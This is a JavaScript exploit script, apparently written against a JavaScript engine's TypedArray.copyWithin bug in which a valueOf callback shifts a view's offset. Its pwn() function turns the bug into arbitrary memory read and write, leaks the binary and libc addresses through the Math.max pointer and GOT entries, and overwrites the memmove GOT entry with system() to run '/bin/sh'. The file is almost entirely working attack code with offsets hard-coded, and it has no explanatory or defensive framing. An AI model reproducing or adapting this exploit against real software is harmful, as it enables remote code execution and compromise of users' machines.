function d_to_i2(d){
         var a = new Uint32Array(new Float64Array([d]).buffer);
         return [a[1], a[0]];
 }

 function i2_to_d(x){
     return new Float64Array(new Uint32Array([x[1], x[0]]).buffer)[0];
 }

function i2_to_hex(i2){
                var v1 = ("00000000" + i2[0].toString(16)).substr(-8);
                var v2 = ("00000000" + i2[1].toString(16)).substr(-8);
         return [v1,v2];
 }

 function p_i2(d){
         print(i2_to_hex(d_to_i2(d))[0]+i2_to_hex(d_to_i2(d))[1])
 }

function convertHex(uInt8_arr,index){
	var result = "0x";
	for(i = 7 ; i >= 0 ; i--) {
		result += uInt8_arr[index+i].toString(16);
	}

	return result;
}

function shiftLeft(data_bytes) {
	var bytes = new Uint8Array(8)

	bytes.set(data_bytes);

	var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = bytes[i];
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }

	return bytes;

}

function shiftRight(data_bytes) {
        var bytes = new Uint8Array(8)

        bytes.set(data_bytes);

        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = bytes[i];
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }



        return bytes;

}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}


function checkForType(arg) {

	var arg2 = new Uint8Array(8);
        if((typeof arg) == 'string') {
                if (arg.startsWith('0x'))
                       	arg = arg.substr(2);
                if (arg.length % 2 == 1)
                        arg = '0' + arg;

                var bigEndian = unhexlify(arg, 8);
                arg2.set(Array.from(bigEndian).reverse());

        } else {
		if(arg.length == undefined)
                	arg2[0] = arg;
		else
			arg2 = arg;
        }

	return arg2;
}

function subtract(a,b) {
	var result = new Uint8Array(8)
	//var arg2 = new Uint8Array(8)		// as it is constant value (224) we need to create Uint8Array and set its [0] position and rest are zeros.
	var arg1 = checkForType(a);
	var arg2 = checkForType(b);
	var carry = 0;

        for (var i = 0; i < 8; i++) {
	    var cur = arg1[i] - arg2[i] - carry;
            carry = cur < 0 | 0;
            result[i] = cur;
        }

	return result;
}

function add(a,b) {
        var result = new Uint8Array(8)
	var arg1 = checkForType(a);
	var arg2 = checkForType(b);
        var carry = 0;

        for (var i = 0; i < 8; i++) {
            var cur = arg1[i] + arg2[i] + carry;
            carry = cur > 0xff | 0;
            result[i] = cur;
        }

        return result;
}


function pwn() {

	// Allocate multiple ArrayBuffers of the largest size such that the data is still stored inline

	var buffers = [];
	for (var i = 0; i < 100; i++) {
		buffers.push(new ArrayBuffer(96));
	}

	var view_79 = new Uint8Array(buffers[79]);


	var hex = { valueOf: function() { view_79.offset = 88; return 0; } };

	// Trigger the bug first time to leak the data pointer of the following ArrayBuffer

	// Below line will copy the data pointer of the buffer[80] on the buffer[79]/view_79 (placed at view_79[88])

	view_79.copyWithin(hex, 40 , 48);


	var tmp = new Uint8Array(buffers[79]);				// Just for display purpose

	console.log("[+] Data pointer of buffer[80] : ", convertHex(tmp,88));

	var buffer_80_DP = shiftLeft(view_79);				// buffer_80_DP will be Uint8Array


	var buffer_79_base = subtract(buffer_80_DP,224)			// buffer_79_base will be Uint8Array

	console.log("[+] Base array structure of view[79] start from  : ", convertHex(buffer_79_base,0));

	view_79.set(shiftRight(buffer_79_base));
	view_79.offset = 0;
	view_79.copyWithin(40, hex , 8);

	//console.log(convertHex(new Uint32Array(buffer_80_DP),0,64));

	/*
		After this we can able to write/overwrite view_79 array structure by writing at view_80 as its data pointer is now point to base address of view_79
	*/

	var inner = buffers[79];

	var outer = new Uint8Array(buffers[80]);

	var memory = {

		write: function(addr,data) {
			outer.set(shiftRight(addr), 32);
            		// Uint8Array's cache the data pointer of the underlying ArrayBuffer
            		var innerView = new Uint8Array(inner);
            		innerView.set(data);
		},
		read : function(addr, length) {
			outer.set(shiftRight(addr), 32);
			var innerView = new Uint8Array(inner);
			return innerView.slice(0, length);
		},
		addressOf: function(obj) {
			inner.leakMe = obj;
			add_of_slot_area = add(buffer_79_base, 16);

			add_of_slot_handle = this.read(add_of_slot_area,8);
			add_of_math_max_fun = this.read(add_of_slot_handle,8);
			return add_of_math_max_fun;
		}

	}

	var systemTofopen = "0x289e0";
	var memmoveOffset = "0x1b94038";
    	var fopenOffset = "0x1b94048";

	var maxFuncOffset = "0xa40077";		// help to get the binary base address.

	var math_max_fun = memory.addressOf(Math.max);

	math_max_fun[6] = 0x00;
	math_max_fun[7] = 0x00;
	math_max_fun = memory.read(add(math_max_fun,40));

	console.log("[+] Math.max function address in binary  : ", convertHex(math_max_fun,0));


	var bin_base = subtract(math_max_fun,maxFuncOffset);

	var memmove_got = add(bin_base, memmoveOffset);

	var fopen_got = add(bin_base, fopenOffset);

    	var libc_fopen = memory.read(fopen_got);


    	var libc_memmove = memory.read(memmove_got);

    	var libc_system = subtract(libc_fopen, systemTofopen);

	console.log("[+] Binary base address  : ", convertHex(bin_base,0));
	console.log("[+] Memmove GOT address  : ", convertHex(memmove_got,0));
	console.log("[+] Fopen GOT address  : ", convertHex(fopen_got,0));
	console.log("[+] Fopen address in libc  : ", convertHex(libc_fopen,0));
	console.log("[+] Memmove address in libc  : ", convertHex(libc_memmove,0));
	console.log("[+] System address in libc  : ", convertHex(libc_system,0));


	var target = new Uint8Array(100);
    	var cmd = "/bin/sh";
    	for (var i = 0; i < cmd.length; i++) {
        	target[i] = cmd.charCodeAt(i);
    	}
    	memory.write(memmove_got, libc_system);
    	target.copyWithin(0, 1);
    	memory.write(memmove_got, libc_memmove);

    	console.log("Done");

}

pwn()
